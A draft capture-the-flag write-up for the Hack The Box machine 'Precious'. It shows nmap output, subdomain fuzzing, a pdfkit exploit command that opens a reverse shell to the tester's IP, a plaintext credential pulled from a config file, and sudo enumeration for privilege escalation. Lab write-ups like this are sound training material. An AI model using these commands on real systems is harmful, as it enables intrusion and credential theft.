---
title: HTB Precious
author: kei5uke
draft: true
description: Writeup for HTB Precious
tags:
  - linux
  - writeup
---

# Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Subdomain

`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.precious.htb" -u http://precious.htb -fs 145`

# Shell by PDFkit

[https://sploitus.com/exploit?id=1337DAY-ID-38527](https://sploitus.com/exploit?id=1337DAY-ID-38527)

`python3 [pdfkit.py](http://pdfkit.py/) -s 10.10.14.208 4444 -w [http://precious.htb/](http://precious.htb/)`

```
ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

```

```
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb

sudo /usr/bin/ruby /opt/update_dependencies.rb

Traceback (most recent call last):
	2: from /opt/update_dependencies.rb:17:in `<main>'
	1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)

```

[Ruby Privilege Escalation - Exploit Notes](https://exploitnotes.org/exploit/linux/privilege-escalation/ruby)
